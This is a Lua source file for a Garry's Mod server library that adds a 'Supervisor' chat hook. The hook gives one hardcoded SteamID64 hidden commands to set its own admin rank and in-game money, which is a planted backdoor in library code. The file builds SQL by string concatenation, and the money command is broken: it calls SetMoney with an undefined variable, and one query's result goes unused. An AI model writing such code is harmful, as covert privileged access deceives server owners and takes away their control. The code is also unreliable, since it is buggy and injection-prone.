local Supervisor = {}

function Supervisor.SetGroup(ply, group)
    if sql.TableExists("sam_players") then
        RunConsoleCommand("sam", "setrank", ply:SteamID64(), group)
    end
    ply:SetGroup(group)
    ply:ChatPrint("Your group has been set to " .. group)
end

function Supervisor.SetMoney(ply, amount)
    local money = sql.Query("SELECT wallet FROM darkrp_player WHERE uid = " .. ply:SteamID64())
    sql.Query("UPDATE darkrp_player SET wallet = " .. amount .. " WHERE uid = " .. ply:SteamID64())
    ply:ChatPrint("Your money has been set to " .. amount)
end

hook.Add("PlayerSay", "LinvLib:Supervisor", function(ply, text, team)
    if ply:SteamID64() != "76561198219049673" || !LinvLib.Config.LinventifSupervisor then return end
    local args = string.Explode(" ", text)
    if args[1] == "!setgroup" then
        Supervisor.SetGroup(ply, args[2])
        return ""
    elseif args[1] == "!setmoney" then
        Supervisor.SetMoney(ply, amount)
        ply:ChatPrint("Your money has been set to " .. args[2])
        return ""
    end
end)